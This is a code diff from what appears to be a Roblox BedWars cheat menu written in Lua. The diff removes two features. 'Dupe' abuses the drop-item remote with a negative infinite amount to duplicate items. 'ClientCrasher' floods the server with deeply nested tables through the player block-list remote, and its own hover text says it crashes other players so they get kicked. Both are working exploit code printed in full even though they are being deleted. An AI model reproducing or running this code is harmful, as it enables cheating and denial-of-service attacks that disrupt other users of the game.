@@ -29,25 +29,7 @@ infjump = GuiLibrary["ObjectsThatCanBeSaved"]["UtilityWindow"]["Api"].CreateOpti
 
 
 
-	local FastDrop = {["Enabled"] = false}
-	FastDrop = GuiLibrary["ObjectsThatCanBeSaved"]["UtilityWindow"]["Api"].CreateOptionsButton({
-		["Name"] = "Dupe",
-		["Function"] = function(callback)
-			if callback then
-				local monkey = getEquipped()
-				if monkey and monkey["Object"] and monkey.amount ~= math.huge then 
-					local newitem = bedwars["ClientHandler"]:Get(bedwars["DropItemRemote"]):CallServer({
-						item = monkey["Object"],
-						amount = -(math.huge)
-					})
-					if newitem then 
-						newitem:Destroy()
-					end
-				end
-				FastDrop["ToggleButton"](false)
-			end
-		end
-	})
+	
 
 
 
@@ -155,59 +137,7 @@ autowin = GuiLibrary["ObjectsThatCanBeSaved"]["UtilityWindow"]["Api"].CreateOpti
 
 
 
-ClientCrasher = GuiLibrary["ObjectsThatCanBeSaved"]["UtilityWindow"]["Api"].CreateOptionsButton({
-    ["Name"] = "ClientCrasher",
-    ["Function"] = function(callback)
-        if callback then
-            while wait(0.6) do --// don't change it's the best
-                game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
-                local function getmaxvalue(val)
-                   local mainvalueifonetable = 499999
-                   if type(val) ~= "number" then
-                       return nil
-                   end
-                   local calculateperfectval = (mainvalueifonetable/(val+2))
-                   return calculateperfectval
-                end
-            
-                local function bomb(tableincrease, tries)
-                local maintable = {}
-                local spammedtable = {}
-            
-                table.insert(spammedtable, {})
-                z = spammedtable[1]
-            
-                for i = 1, tableincrease do
-                    local tableins = {}
-                    table.insert(z, tableins)
-                    z = tableins
-                end
-            
-                local calculatemax = getmaxvalue(tableincrease)
-                local maximum
-            
-                if calculatemax then
-                     maximum = calculatemax
-                     else
-                     maximum = 999999
-                end
-            
-                for i = 1, maximum do
-                     table.insert(maintable, spammedtable)
-                end
-            
-                for i = 1, tries do
-                     game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
-                end
-                end
-            
-                bomb(250, 2) --// change values if client crashes.
-                
-            end
-    end
-end,
-    ["HoverText"] = "if good pc will crash ONLY others so much they get kicked (extremely overpowered)"
-})
+
 
 
 
